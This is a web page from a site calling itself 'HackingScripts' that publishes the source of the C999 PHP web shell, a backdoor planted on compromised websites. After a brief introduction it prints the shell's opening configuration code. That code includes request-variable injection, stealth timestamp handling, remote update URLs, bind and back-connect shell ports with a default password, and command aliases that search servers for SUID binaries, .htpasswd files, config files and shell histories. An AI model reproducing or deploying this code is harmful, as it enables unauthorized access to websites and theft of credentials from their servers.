<!DOCTYPE html>
<html>
  <head>
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <link rel="stylesheet" type="text/css" href="/stylesheets/stylesheet.css" media="screen" />
    <link rel="stylesheet" type="text/css" href="/stylesheets/pygment_trac.css" media="screen" />
    <link rel="stylesheet" type="text/css" href="/stylesheets/print.css" media="print" />
    <link rel="stylesheet" type="text/css" href="/stylesheets/styles.css" media="print" />
    <link rel="icon" type="image/x-icon" href="/favicon.ico">


    <!--[if lt IE 9]>
    <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->

    <title> C999 shell </title>
  </head>

  <body>
    <header>
      <div class="inner">
        <h1> <a href="/">HackingScripts</a> </h1>
        <h2>Hack Scripts for everybody</h2>
      </div>
    </header>

    <div id="content-wrapper">
      <div class="inner clearfix">
        <section id="main-content">

          <h2>C999 shell</h2>
<p class="meta">24 Jan 2014</p>

<p>This was the very first hack script uploaded to my website, so it holds a special place in my heart.</p>

<p>It&#8217;s a version of the <a href="http://hackingscripts.com/c99-shell/" title="C99 Shell">c99 shell script</a>, which is used by hackers (read: script kiddies) to gain backdoor entry into insecure websites.</p>

<p>It appears to be incomplete (I added the final &#8216;?&gt;&#8217;), perhaps because the end of the script was cut off during the upload process. Note that this script is only just over 1100 lines long, while the <a href="http://hackingscripts.com/c99-shell/" title="C99 Shell">complete C99 shell</a> is about 2000 lines longer!</p>

<p>I have received many more C99 scripts since this one, most of them complete and more up-to-date than this one.</p>

<h3>C999 Shell Script Source Code</h3>

<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="lineno">   1</span> <span class="cp">&lt;?php</span> <span class="c1">//Starting calls if (!function_exists(&quot;getmicrotime&quot;)) {function getmicrotime() { list($usec, $sec) = explode(&quot; &quot;, microtime());  return ((float)$usec + (float)$sec);}} error_reporting(5); @ignore_user_abort(TRUE); @set_magic_quotes_runtime(0); $win = strtolower(substr(PHP_OS,0,3)) == &quot;win&quot;; define(&quot;starttime&quot;,getmicrotime()); if (get_magic_quotes_gpc()) {if (!function_exists(&quot;strips&quot;)) { function strips(&amp;$arr,$k=&quot;&quot;) {if (is_array($arr))  {foreach($arr as $k=--&gt;$v) {if (strtoupper($k) != &quot;GLOBALS&quot;) {strips($arr[&quot;$k&quot;]);}}}</span>
<span class="lineno">   2</span> <span class="k">else</span> <span class="p">{</span><span class="nv">$arr</span> <span class="o">=</span> <span class="nb">stripslashes</span><span class="p">(</span><span class="nv">$arr</span><span class="p">);}}}</span> <span class="nx">strips</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">);}</span>
<span class="lineno">   3</span> <span class="nv">$_REQUEST</span> <span class="o">=</span> <span class="nb">array_merge</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">,</span><span class="nv">$_GET</span><span class="p">,</span><span class="nv">$_POST</span><span class="p">);</span>
<span class="lineno">   4</span> <span class="k">foreach</span><span class="p">(</span><span class="nv">$_REQUEST</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&gt;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$$k</span><span class="p">))</span> <span class="p">{</span><span class="nv">$$k</span> <span class="o">=</span> <span class="nv">$v</span><span class="p">;}}</span>
<span class="lineno">   5</span> <span class="nv">$shver</span> <span class="o">=</span> <span class="s2">&quot;1.0 pre-release build #16&quot;</span><span class="p">;</span> <span class="c1">//Current version</span>
<span class="lineno">   6</span> <span class="c1">//CONFIGURATION AND SETTINGS</span>
<span class="lineno">   7</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$unset_surl</span><span class="p">))</span> <span class="p">{</span><span class="nb">setcookie</span><span class="p">(</span><span class="s2">&quot;c999sh_surl&quot;</span><span class="p">);</span> <span class="nv">$surl</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;}</span>
<span class="lineno">   8</span> <span class="k">elseif</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$set_surl</span><span class="p">))</span> <span class="p">{</span><span class="nv">$surl</span> <span class="o">=</span> <span class="nv">$set_surl</span><span class="p">;</span> <span class="nb">setcookie</span><span class="p">(</span><span class="s2">&quot;c999sh_surl&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="p">);}</span>
<span class="lineno">   9</span> <span class="k">else</span> <span class="p">{</span><span class="nv">$surl</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;c999sh_surl&quot;</span><span class="p">];</span> <span class="c1">//Set this cookie for manual SURL</span>
<span class="lineno">  10</span> <span class="p">}</span>
<span class="lineno">  11</span> <span class="nv">$surl_autofill_include</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span> <span class="c1">//If TRUE then search variables with</span>
<span class="lineno">  12</span>                                <span class="c1">//descriptors (URLs) and save it in SURL.</span>
<span class="lineno">  13</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$surl_autofill_include</span> <span class="k">and</span> <span class="o">!</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;c999sh_surl&quot;</span><span class="p">])</span> <span class="p">{</span><span class="nv">$include</span> <span class="o">=</span> <span class="s2">&quot;&amp;&quot;</span><span class="p">;</span> <span class="k">foreach</span>
<span class="lineno">  14</span> <span class="p">(</span><span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;&amp;&quot;</span><span class="p">,</span><span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;QUERY_STRING&quot;</span><span class="p">))</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="nv">$v</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;=&quot;</span><span class="p">,</span><span class="nv">$v</span><span class="p">);</span>
<span class="lineno">  15</span> <span class="nv">$name</span> <span class="o">=</span> <span class="nb">urldecode</span><span class="p">(</span><span class="nv">$v</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
<span class="lineno">  16</span> <span class="nv">$value</span> <span class="o">=</span> <span class="nb">urldecode</span><span class="p">(</span><span class="nv">$v</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
<span class="lineno">  17</span> <span class="k">foreach</span> <span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;http://&quot;</span><span class="p">,</span><span class="s2">&quot;https://&quot;</span><span class="p">,</span><span class="s2">&quot;ssl://&quot;</span><span class="p">,</span><span class="s2">&quot;ftp://&quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\\\\</span><span class="s2">&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$needle</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">  18</span> <span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$value</span><span class="p">,</span><span class="nv">$needle</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">  19</span> <span class="nv">$includestr</span> <span class="o">.=</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$value</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;&quot;</span><span class="p">;}}}</span>
<span class="lineno">  20</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;surl_autofill_include&quot;</span><span class="p">])</span> <span class="p">{</span>
<span class="lineno">  21</span> <span class="nv">$includestr</span> <span class="o">.=</span> <span class="s2">&quot;surl_autofill_include=1&amp;&quot;</span><span class="p">;}}</span>
<span class="lineno">  22</span> <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$surl</span><span class="p">))</span>
<span class="lineno">  23</span> <span class="p">{</span>
<span class="lineno">  24</span>  <span class="nv">$surl</span> <span class="o">=</span> <span class="s2">&quot;?&quot;</span><span class="o">.</span><span class="nv">$includestr</span><span class="p">;</span> <span class="c1">//Self url</span>
<span class="lineno">  25</span> <span class="p">}</span>
<span class="lineno">  26</span> <span class="nv">$surl</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$surl</span><span class="p">);</span>
<span class="lineno">  27</span> <span class="nv">$timelimit</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">//time limit of execution this script over server quote</span>
<span class="lineno">  28</span>                 <span class="c1">//(seconds), 0 = unlimited.</span>
<span class="lineno">  29</span> <span class="c1">//Authentication</span>
<span class="lineno">  30</span> <span class="nv">$login</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> <span class="c1">//login</span>
<span class="lineno">  31</span> <span class="c1">//DON&#39;T FORGOT ABOUT PASSWORD!!!</span>
<span class="lineno">  32</span> <span class="nv">$pass</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> <span class="c1">//password</span>
<span class="lineno">  33</span> <span class="nv">$md5_pass</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> <span class="c1">//md5-cryped pass. if null, md5($pass)</span>
<span class="lineno">  34</span> <span class="nv">$host_allow</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;*&quot;</span><span class="p">);</span> <span class="c1">//array (&quot;{mask}1&quot;,&quot;{mask}2&quot;,...), {mask} = IP or HOST e.g. array(&quot;192.168.0.*&quot;,&quot;127.0.0.1&quot;)</span>
<span class="lineno">  35</span> <span class="nv">$login_txt</span> <span class="o">=</span> <span class="s2">&quot;Restricted area&quot;</span><span class="p">;</span> <span class="c1">//http-auth message.</span>
<span class="lineno">  36</span> <span class="nv">$accessdeniedmess</span> <span class="o">=</span> <span class="s2">&quot;&lt;a href=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">http</span><span class="o">://</span><span class="nx">ccteam</span><span class="o">.</span><span class="nx">ru</span><span class="o">/</span><span class="nx">releases</span><span class="o">/</span><span class="nx">c999shell\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot;&gt;c999shell v.&quot;</span><span class="o">.</span><span class="nv">$shver</span><span class="o">.</span><span class="s2">&quot;&lt;/a&gt;: access denied&quot;</span><span class="p">;</span>
<span class="lineno">  37</span> <span class="nv">$gzipencode</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span> <span class="c1">//Encode with gzip?</span>
<span class="lineno">  38</span> <span class="nv">$updatenow</span> <span class="o">=</span> <span class="k">FALSE</span><span class="p">;</span> <span class="c1">//If TRUE, update now (this variable will be FALSE)</span>
<span class="lineno">  39</span> <span class="nv">$c999sh_updateurl</span> <span class="o">=</span> <span class="s2">&quot;http://ccteam.ru/update/c999shell/&quot;</span><span class="p">;</span> <span class="c1">//Update server</span>
<span class="lineno">  40</span> <span class="nv">$c999sh_sourcesurl</span> <span class="o">=</span> <span class="s2">&quot;http://ccteam.ru/files/c999sh_sources/&quot;</span><span class="p">;</span> <span class="c1">//Sources-server</span>
<span class="lineno">  41</span> <span class="nv">$filestealth</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span> <span class="c1">//if TRUE, don&#39;t change modify- and access-time</span>
<span class="lineno">  42</span> <span class="nv">$donated_html</span> <span class="o">=</span> <span class="s2">&quot;&lt;/pre&gt;</span>
<span class="lineno">  43</span> <span class="s2">&lt;center&gt;&lt;b&gt;Owned by hacker&lt;/b&gt;&lt;/center&gt;</span>
<span class="lineno">  44</span> <span class="s2">&lt;pre&gt;&quot;</span><span class="p">;</span>
<span class="lineno">  45</span> <span class="cm">/* If you publish free shell and you wish</span>
<span class="lineno">  46</span> <span class="cm">add link to your site or any other information,</span>
<span class="lineno">  47</span> <span class="cm">put here your html. */</span>
<span class="lineno">  48</span> <span class="nv">$donated_act</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">);</span> <span class="c1">//array (&quot;act1&quot;,&quot;act2,&quot;...), if $act is in this array, display $donated_html.</span>
<span class="lineno">  49</span> <span class="nv">$curdir</span> <span class="o">=</span> <span class="s2">&quot;./&quot;</span><span class="p">;</span> <span class="c1">//start folder</span>
<span class="lineno">  50</span> <span class="c1">//$curdir = getenv(&quot;DOCUMENT_ROOT&quot;);</span>
<span class="lineno">  51</span> <span class="nv">$tmpdir</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> <span class="c1">//Folder for tempory files. If empty, auto-fill (/tmp or %WINDIR/temp)</span>
<span class="lineno">  52</span> <span class="nv">$tmpdir_log</span> <span class="o">=</span> <span class="s2">&quot;./&quot;</span><span class="p">;</span> <span class="c1">//Directory logs of long processes (e.g. brute, scan...)</span>
<span class="lineno">  53</span> <span class="nv">$log_email</span> <span class="o">=</span> <span class="s2">&quot;user@host.tld&quot;</span><span class="p">;</span> <span class="c1">//Default e-mail for sending logs</span>
<span class="lineno">  54</span> <span class="nv">$sort_default</span> <span class="o">=</span> <span class="s2">&quot;0a&quot;</span><span class="p">;</span> <span class="c1">//Default sorting, 0 - number of colomn, &quot;a&quot;scending or &quot;d&quot;escending</span>
<span class="lineno">  55</span> <span class="nv">$sort_save</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span> <span class="c1">//If TRUE then save sorting-position using cookies.</span>
<span class="lineno">  56</span> <span class="c1">// Registered file-types.</span>
<span class="lineno">  57</span> <span class="c1">//  array(</span>
<span class="lineno">  58</span> <span class="c1">//   &quot;{action1}&quot;=&gt;array(&quot;ext1&quot;,&quot;ext2&quot;,&quot;ext3&quot;,...),</span>
<span class="lineno">  59</span> <span class="c1">//   &quot;{action2}&quot;=&gt;array(&quot;ext4&quot;,&quot;ext5&quot;,&quot;ext6&quot;,...),</span>
<span class="lineno">  60</span> <span class="c1">//   ...</span>
<span class="lineno">  61</span> <span class="c1">//  )</span>
<span class="lineno">  62</span> <span class="nv">$ftypes</span>  <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
<span class="lineno">  63</span>  <span class="s2">&quot;html&quot;</span><span class="o">=&gt;</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;html&quot;</span><span class="p">,</span><span class="s2">&quot;htm&quot;</span><span class="p">,</span><span class="s2">&quot;shtml&quot;</span><span class="p">),</span>
<span class="lineno">  64</span>  <span class="s2">&quot;txt&quot;</span><span class="o">=&gt;</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;txt&quot;</span><span class="p">,</span><span class="s2">&quot;conf&quot;</span><span class="p">,</span><span class="s2">&quot;bat&quot;</span><span class="p">,</span><span class="s2">&quot;sh&quot;</span><span class="p">,</span><span class="s2">&quot;js&quot;</span><span class="p">,</span><span class="s2">&quot;bak&quot;</span><span class="p">,</span><span class="s2">&quot;doc&quot;</span><span class="p">,</span><span class="s2">&quot;log&quot;</span><span class="p">,</span><span class="s2">&quot;sfc&quot;</span><span class="p">,</span><span class="s2">&quot;cfg&quot;</span><span class="p">,</span><span class="s2">&quot;htaccess&quot;</span><span class="p">),</span>
<span class="lineno">  65</span>  <span class="s2">&quot;exe&quot;</span><span class="o">=&gt;</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;sh&quot;</span><span class="p">,</span><span class="s2">&quot;install&quot;</span><span class="p">,</span><span class="s2">&quot;bat&quot;</span><span class="p">,</span><span class="s2">&quot;cmd&quot;</span><span class="p">),</span>
<span class="lineno">  66</span>  <span class="s2">&quot;ini&quot;</span><span class="o">=&gt;</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;ini&quot;</span><span class="p">,</span><span class="s2">&quot;inf&quot;</span><span class="p">),</span>
<span class="lineno">  67</span>  <span class="s2">&quot;code&quot;</span><span class="o">=&gt;</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;php&quot;</span><span class="p">,</span><span class="s2">&quot;phtml&quot;</span><span class="p">,</span><span class="s2">&quot;php3&quot;</span><span class="p">,</span><span class="s2">&quot;php4&quot;</span><span class="p">,</span><span class="s2">&quot;inc&quot;</span><span class="p">,</span><span class="s2">&quot;tcl&quot;</span><span class="p">,</span><span class="s2">&quot;h&quot;</span><span class="p">,</span><span class="s2">&quot;c&quot;</span><span class="p">,</span><span class="s2">&quot;cpp&quot;</span><span class="p">,</span><span class="s2">&quot;py&quot;</span><span class="p">,</span><span class="s2">&quot;cgi&quot;</span><span class="p">,</span><span class="s2">&quot;pl&quot;</span><span class="p">),</span>
<span class="lineno">  68</span>  <span class="s2">&quot;img&quot;</span><span class="o">=&gt;</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;gif&quot;</span><span class="p">,</span><span class="s2">&quot;png&quot;</span><span class="p">,</span><span class="s2">&quot;jpeg&quot;</span><span class="p">,</span><span class="s2">&quot;jfif&quot;</span><span class="p">,</span><span class="s2">&quot;jpg&quot;</span><span class="p">,</span><span class="s2">&quot;jpe&quot;</span><span class="p">,</span><span class="s2">&quot;bmp&quot;</span><span class="p">,</span><span class="s2">&quot;ico&quot;</span><span class="p">,</span><span class="s2">&quot;tif&quot;</span><span class="p">,</span><span class="s2">&quot;tiff&quot;</span><span class="p">,</span><span class="s2">&quot;avi&quot;</span><span class="p">,</span><span class="s2">&quot;mpg&quot;</span><span class="p">,</span><span class="s2">&quot;mpeg&quot;</span><span class="p">),</span>
<span class="lineno">  69</span>  <span class="s2">&quot;sdb&quot;</span><span class="o">=&gt;</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;sdb&quot;</span><span class="p">),</span>
<span class="lineno">  70</span>  <span class="s2">&quot;phpsess&quot;</span><span class="o">=&gt;</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;sess&quot;</span><span class="p">),</span>
<span class="lineno">  71</span>  <span class="s2">&quot;download&quot;</span><span class="o">=&gt;</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;exe&quot;</span><span class="p">,</span><span class="s2">&quot;com&quot;</span><span class="p">,</span><span class="s2">&quot;pif&quot;</span><span class="p">,</span><span class="s2">&quot;src&quot;</span><span class="p">,</span><span class="s2">&quot;lnk&quot;</span><span class="p">,</span><span class="s2">&quot;zip&quot;</span><span class="p">,</span><span class="s2">&quot;rar&quot;</span><span class="p">,</span><span class="s2">&quot;gz&quot;</span><span class="p">,</span><span class="s2">&quot;tar&quot;</span><span class="p">)</span>
<span class="lineno">  72</span> <span class="p">);</span>
<span class="lineno">  73</span> <span class="c1">// Registered executable file-types.</span>
<span class="lineno">  74</span> <span class="c1">//  array(</span>
<span class="lineno">  75</span> <span class="c1">//   string &quot;command{i}&quot;=&gt;array(&quot;ext1&quot;,&quot;ext2&quot;,&quot;ext3&quot;,...),</span>
<span class="lineno">  76</span> <span class="c1">//   ...</span>
<span class="lineno">  77</span> <span class="c1">//  )</span>
<span class="lineno">  78</span> <span class="c1">//   {command}: %f% = filename</span>
<span class="lineno">  79</span> <span class="nv">$exeftypes</span>  <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
<span class="lineno">  80</span>  <span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;PHPRC&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot; -q %f%&quot;</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;php&quot;</span><span class="p">,</span><span class="s2">&quot;php3&quot;</span><span class="p">,</span><span class="s2">&quot;php4&quot;</span><span class="p">),</span>
<span class="lineno">  81</span>  <span class="s2">&quot;perl %f%&quot;</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;pl&quot;</span><span class="p">,</span><span class="s2">&quot;cgi&quot;</span><span class="p">)</span>
<span class="lineno">  82</span> <span class="p">);</span>
<span class="lineno">  83</span> <span class="cm">/* Highlighted files.</span>
<span class="lineno">  84</span> <span class="cm">  array(</span>
<span class="lineno">  85</span> <span class="cm">   i=&gt;array({regexp},{type},{opentag},{closetag},{break})</span>
<span class="lineno">  86</span> <span class="cm">   ...</span>
<span class="lineno">  87</span> <span class="cm">  )</span>
<span class="lineno">  88</span> <span class="cm">  string {regexp} - regular exp.</span>
<span class="lineno">  89</span> <span class="cm">  int {type}:</span>
<span class="lineno">  90</span> <span class="cm">0 - files and folders (as default),</span>
<span class="lineno">  91</span> <span class="cm">1 - files only, 2 - folders only</span>
<span class="lineno">  92</span> <span class="cm">  string {opentag} - open html-tag, e.g. &quot;&lt;b&gt;&quot; (default)</span>
<span class="lineno">  93</span> <span class="cm">  string {closetag} - close html-tag, e.g. &quot;&lt;/b&gt;&quot; (default)</span>
<span class="lineno">  94</span> <span class="cm">  bool {break} - if TRUE and found match then break</span>
<span class="lineno">  95</span> <span class="cm">*/</span>
<span class="lineno">  96</span> <span class="nv">$regxp_highlight</span>  <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
<span class="lineno">  97</span>   <span class="k">array</span><span class="p">(</span><span class="nb">basename</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;PHP_SELF&quot;</span><span class="p">]),</span><span class="mi">1</span><span class="p">,</span><span class="s2">&quot;&lt;/pre&gt;</span>
<span class="lineno">  98</span> <span class="s2">&lt;span&gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&lt;/span&gt;</span>
<span class="lineno">  99</span> <span class="s2">&lt;pre&gt;&quot;</span><span class="p">),</span> <span class="c1">// example</span>
<span class="lineno"> 100</span>   <span class="k">array</span><span class="p">(</span><span class="s2">&quot;config.php&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span> <span class="c1">// example</span>
<span class="lineno"> 101</span> <span class="p">);</span>
<span class="lineno"> 102</span> <span class="nv">$safemode_diskettes</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;a&quot;</span><span class="p">);</span> <span class="c1">// This variable for disabling diskett-errors.</span>
<span class="lineno"> 103</span>  <span class="c1">// array (i=&gt;{letter} ...); string {letter} - letter of a drive</span>
<span class="lineno"> 104</span> <span class="c1">//$safemode_diskettes = range(&quot;a&quot;,&quot;z&quot;);</span>
<span class="lineno"> 105</span> <span class="nv">$hexdump_lines</span> <span class="o">=</span> <span class="mi">8</span><span class="p">;</span><span class="c1">// lines in hex preview file</span>
<span class="lineno"> 106</span> <span class="nv">$hexdump_rows</span> <span class="o">=</span> <span class="mi">24</span><span class="p">;</span><span class="c1">// 16, 24 or 32 bytes in one line</span>
<span class="lineno"> 107</span> <span class="nv">$nixpwdperpage</span> <span class="o">=</span> <span class="mi">100</span><span class="p">;</span> <span class="c1">// Get first N lines from /etc/passwd</span>
<span class="lineno"> 108</span> <span class="nv">$bindport_pass</span> <span class="o">=</span> <span class="s2">&quot;c999&quot;</span><span class="p">;</span>  <span class="c1">// default password for binding</span>
<span class="lineno"> 109</span> <span class="nv">$bindport_port</span> <span class="o">=</span> <span class="s2">&quot;31373&quot;</span><span class="p">;</span> <span class="c1">// default port for binding</span>
<span class="lineno"> 110</span> <span class="nv">$bc_port</span> <span class="o">=</span> <span class="s2">&quot;31373&quot;</span><span class="p">;</span> <span class="c1">// default port for back-connect</span>
<span class="lineno"> 111</span> <span class="nv">$datapipe_localport</span> <span class="o">=</span> <span class="s2">&quot;8081&quot;</span><span class="p">;</span> <span class="c1">// default port for datapipe</span>
<span class="lineno"> 112</span> <span class="c1">// Command-aliases</span>
<span class="lineno"> 113</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$win</span><span class="p">)</span>
<span class="lineno"> 114</span> <span class="p">{</span>
<span class="lineno"> 115</span>  <span class="nv">$cmdaliases</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
<span class="lineno"> 116</span>   <span class="k">array</span><span class="p">(</span><span class="s2">&quot;-----------------------------------------------------------&quot;</span><span class="p">,</span> <span class="s2">&quot;ls -la&quot;</span><span class="p">),</span>
<span class="lineno"> 117</span>   <span class="k">array</span><span class="p">(</span><span class="s2">&quot;find all suid files&quot;</span><span class="p">,</span> <span class="s2">&quot;find / -type f -perm -04000 -ls&quot;</span><span class="p">),</span>
<span class="lineno"> 118</span>   <span class="k">array</span><span class="p">(</span><span class="s2">&quot;find suid files in current dir&quot;</span><span class="p">,</span> <span class="s2">&quot;find . -type f -perm -04000 -ls&quot;</span><span class="p">),</span>
<span class="lineno"> 119</span>   <span class="k">array</span><span class="p">(</span><span class="s2">&quot;find all sgid files&quot;</span><span class="p">,</span> <span class="s2">&quot;find / -type f -perm -02000 -ls&quot;</span><span class="p">),</span>
<span class="lineno"> 120</span>   <span class="k">array</span><span class="p">(</span><span class="s2">&quot;find sgid files in current dir&quot;</span><span class="p">,</span> <span class="s2">&quot;find . -type f -perm -02000 -ls&quot;</span><span class="p">),</span>
<span class="lineno"> 121</span>   <span class="k">array</span><span class="p">(</span><span class="s2">&quot;find config.inc.php files&quot;</span><span class="p">,</span> <span class="s2">&quot;find / -type f -name config.inc.php&quot;</span><span class="p">),</span>
<span class="lineno"> 122</span>   <span class="k">array</span><span class="p">(</span><span class="s2">&quot;find config* files&quot;</span><span class="p">,</span> <span class="s2">&quot;find / -type f -name </span><span class="se">\&quot;</span><span class="s2">config*</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">),</span>
<span class="lineno"> 123</span>   <span class="k">array</span><span class="p">(</span><span class="s2">&quot;find config* files in current dir&quot;</span><span class="p">,</span> <span class="s2">&quot;find . -type f -name </span><span class="se">\&quot;</span><span class="s2">config*</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">),</span>
<span class="lineno"> 124</span>   <span class="k">array</span><span class="p">(</span><span class="s2">&quot;find all writable folders and files&quot;</span><span class="p">,</span> <span class="s2">&quot;find / -perm -2 -ls&quot;</span><span class="p">),</span>
<span class="lineno"> 125</span>   <span class="k">array</span><span class="p">(</span><span class="s2">&quot;find all writable folders and files in current dir&quot;</span><span class="p">,</span> <span class="s2">&quot;find . -perm -2 -ls&quot;</span><span class="p">),</span>
<span class="lineno"> 126</span>   <span class="k">array</span><span class="p">(</span><span class="s2">&quot;find all service.pwd files&quot;</span><span class="p">,</span> <span class="s2">&quot;find / -type f -name service.pwd&quot;</span><span class="p">),</span>
<span class="lineno"> 127</span>   <span class="k">array</span><span class="p">(</span><span class="s2">&quot;find service.pwd files in current dir&quot;</span><span class="p">,</span> <span class="s2">&quot;find . -type f -name service.pwd&quot;</span><span class="p">),</span>
<span class="lineno"> 128</span>   <span class="k">array</span><span class="p">(</span><span class="s2">&quot;find all .htpasswd files&quot;</span><span class="p">,</span> <span class="s2">&quot;find / -type f -name .htpasswd&quot;</span><span class="p">),</span>
<span class="lineno"> 129</span>   <span class="k">array</span><span class="p">(</span><span class="s2">&quot;find .htpasswd files in current dir&quot;</span><span class="p">,</span> <span class="s2">&quot;find . -type f -name .htpasswd&quot;</span><span class="p">),</span>
<span class="lineno"> 130</span>   <span class="k">array</span><span class="p">(</span><span class="s2">&quot;find all .bash_history files&quot;</span><span class="p">,</span> <span class="s2">&quot;find / -type f -name .bash_history&quot;</span><span class="p">),</span>
<span class="lineno"> 131</span>   <span class="k">array</span><span class="p">(</span><span class="s2">&quot;find .bash_history files in current dir&quot;</span><span class="p">,</span> <span class="s2">&quot;find . -type f -name .bash_history&quot;</span><span class="p">),</span>
<span class="lineno"> 132</span>   <span class="k">array</span><span class="p">(</span><span class="s2">&quot;find all .fetchmailrc files&quot;</span><span class="p">,</span> <span class="s2">&quot;find / -type f -name .fetchmailrc&quot;</span><span class="p">),</span>
<span class="lineno"> 133</span>   <span class="k">array</span><span class="p">(</span><span class="s2">&quot;find .fetchmailrc files in current dir&quot;</span><span class="p">,</span> <span class="s2">&quot;find . -type f -name .fetchmailrc&quot;</span><span class="p">),</span>
<span class="lineno"> 134</span>   <span class="k">array</span><span class="p">(</span><span class="s2">&quot;list file attributes on a Linux second extended file system&quot;</span><span class="p">,</span> <span class="s2">&quot;lsattr -va&quot;</span><span class="p">),</span>
<span class="lineno"> 135</span>   <span class="k">array</span><span class="p">(</span><span class="s2">&quot;show opened ports&quot;</span><span class="p">,</span> <span class="s2">&quot;netstat -an | grep -i listen&quot;</span><span class="p">)</span>
<span class="lineno"> 136</span>  <span class="p">);</span>
<span class="lineno"> 137</span> <span class="p">}</span>
<span class="lineno"> 138</span> <span class="k">else</span>
<span class="lineno"> 139</span> <span class="p">{</span>
<span class="lineno"> 140</span>  <span class="nv">$cmdaliases</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
<span class="lineno"> 141</span>   <span class="k">array</span><span class="p">(</span><span class="s2">&quot;-----------------------------------------------------------&quot;</span><span class="p">,</span> <span class="s2">&quot;dir&quot;</span><span class="p">),</span>
<span class="lineno"> 142</span>   <span class="k">array</span><span class="p">(</span><span class="s2">&quot;show opened ports&quot;</span><span class="p">,</span> <span class="s2">&quot;netstat -an&quot;</span><span class="p">)</span>
<span class="lineno"> 143</span>  <span class="p">);</span>
<span class="lineno"> 144</span> <span class="p">}</span>
<span class="lineno"> 145</span> <span class="nv">$sess_cookie</span> <span class="o">=</span> <span class="s2">&quot;c999shvars&quot;</span><span class="p">;</span> <span class="c1">// Cookie-variable name</span>
<span class="lineno"> 146</span> <span class="nv">$usefsbuff</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span> <span class="c1">//Buffer-function</span>
